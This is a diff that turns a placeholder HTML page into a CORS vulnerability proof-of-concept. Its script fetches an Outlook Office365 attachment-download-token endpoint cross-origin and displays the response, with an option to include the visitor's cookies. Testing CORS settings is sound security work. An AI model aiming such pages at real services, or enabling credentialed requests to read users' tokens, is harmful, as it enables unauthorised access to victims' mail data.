@@ -1,9 +1,57 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>meow</title>
+  <meta charset="UTF-8">
+  <title>CORS Vulnerability PoC</title>
 </head>
 <body>
- meow
+  <h1>CORS PoC Test</h1>
+  <p><strong>Status:</strong> <span id="status">Waiting…</span></p>
+  <pre id="output" style="white-space: pre-wrap; word-wrap: break-word;"></pre>
+
+  <script>
+    // === CONFIGURATION ===
+    const target = "https://outlook.office365.com/owa/service.svc?action=GetAttachmentDownloadToken&app=Mail&n=76"; // replace with your target
+    const method = "GET"; // or "POST"
+    const sendCredentials = false; // set true to test with cookies (if applicable)
+
+    const data = {
+      example: "payload",
+      action: "test"
+    };
+
+    // === LAUNCH CORS TEST ===
+    (async function() {
+      document.getElementById("status").textContent = "Requesting…";
+
+      try {
+        const response = await fetch(target, {
+          method: method,
+          mode: "cors",
+          credentials: sendCredentials ? "include" : "omit",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          ...(method === "POST" ? { body: JSON.stringify(data) } : {})
+        });
+
+        const contentType = response.headers.get("content-type");
+        let output;
+
+        if (contentType && contentType.includes("application/json")) {
+          const json = await response.json();
+          output = JSON.stringify(json, null, 2);
+        } else {
+          output = await response.text();
+        }
+
+        document.getElementById("status").textContent = `✅ ${response.status} ${response.statusText}`;
+        document.getElementById("output").textContent = output;
+      } catch (err) {
+        document.getElementById("status").textContent = "❌ Request failed or blocked";
+        document.getElementById("output").textContent = err.toString();
+      }
+    })();
+  </script>
 </body>
 </html>
